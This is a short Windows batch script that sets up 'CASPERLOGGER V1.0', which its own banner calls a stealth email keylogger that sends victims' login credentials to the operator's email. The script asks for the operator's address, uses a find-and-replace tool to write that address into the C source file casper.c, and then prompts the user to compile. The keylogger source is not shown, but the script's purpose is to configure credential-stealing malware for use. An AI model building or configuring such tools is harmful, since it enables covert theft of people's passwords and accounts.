@ECHO OFF
TYPE ghost.txt
ECHO.
ECHO CASPERLOGGER V1.0
ECHO.--------------------------------------------
ECHO is stealth email keylogger which will send 
ECHO login credentials data to your email  
ECHO to use it you just set the email 
ECHO which was registered first on SMTP register.
ECHO.
ECHO/********************************************
ECHO for example                                *
ECHO Type your email:                           *
ECHO sillhouette@gmail.com [ENTER]              *
ECHO.                                           *
ECHO press [F6] and then press [ENTER]          *
ECHO\********************************************
ECHO.
ECHO Type your Email:


:: Only one single command line is needed to receive user input
FOR /F "tokens=*" %%A IN ('TYPE CON') DO SET INPUT=%%A
:: Use quotes if you want to display redirection characters as well
ECHO This email "%INPUT%" is successfully setup. Now its time to compile it!
fart.exe casper.c your@email.com %INPUT%
ECHO Compile now!